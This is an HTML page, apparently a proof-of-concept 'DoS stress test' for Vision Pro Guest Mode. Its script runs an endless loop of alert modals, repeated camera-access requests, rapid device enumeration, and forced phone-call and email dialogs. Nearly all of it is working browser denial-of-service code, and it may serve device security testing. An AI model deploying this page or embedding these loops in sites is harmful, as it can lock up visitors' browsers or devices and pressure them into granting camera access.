<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Vision Pro DoS Stress Test</title>
  <style>
    body { font-family: -apple-system; padding: 1em; }
    button { margin: 6px; padding: 10px 14px; }
    .log { background: #000; color: #0f0; padding: 1em; font-size: 12px; height: 200px; overflow: auto; margin-top: 20px; }
  </style>
</head>
<body>
  <h1>Vision Pro Guest Mode – DoS Stress Test</h1>
  <button onclick="startAlerts()">Start Infinite Alerts</button>
  <button onclick="stopAlerts()">Stop Alerts</button>
  <button onclick="startCameraLoop()">Start Camera Loop</button>
  <button onclick="startDeviceLoop()">Start Device Loop</button>
  <button onclick="location.href='tel:+18005551234'">Trigger Call Dialog</button>
  <button onclick="location.href='mailto:test@example.com'">Trigger Email Dialog</button>
  <input type="file" accept="image/*" capture><br><br>
  <video id="cam" autoplay muted playsinline></video>
  <div class="log" id="log">Log output:</div>

  <script>
    let alertInterval = null;
    let camLoop = null;
    let devLoop = null;
    const log = (msg) => {
      const el = document.getElementById('log');
      el.innerText += "\n" + msg;
      el.scrollTop = el.scrollHeight;
    };

    function startAlerts() {
      if (alertInterval) return;
      alertInterval = setInterval(() => alert("⚠️ Alert Modal Loop"), 700);
      log("Infinite alerts started.");
    }

    function stopAlerts() {
      clearInterval(alertInterval);
      alertInterval = null;
      log("Alerts stopped.");
    }

    function startCameraLoop() {
      if (camLoop) return;
      camLoop = setInterval(() => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            document.getElementById("cam").srcObject = stream;
            log("Camera stream obtained");
          })
          .catch(err => log("Camera error: " + err.message));
      }, 1000);
      log("Camera stress loop started.");
    }

    function startDeviceLoop() {
      if (devLoop) return;
      devLoop = setInterval(() => {
        navigator.mediaDevices.enumerateDevices()
          .then(devices => log("Enumerated " + devices.length + " devices"))
          .catch(err => log("Device error: " + err.message));
      }, 500);
      log("Device enumeration loop started.");
    }
  </script>
</body>
</html>
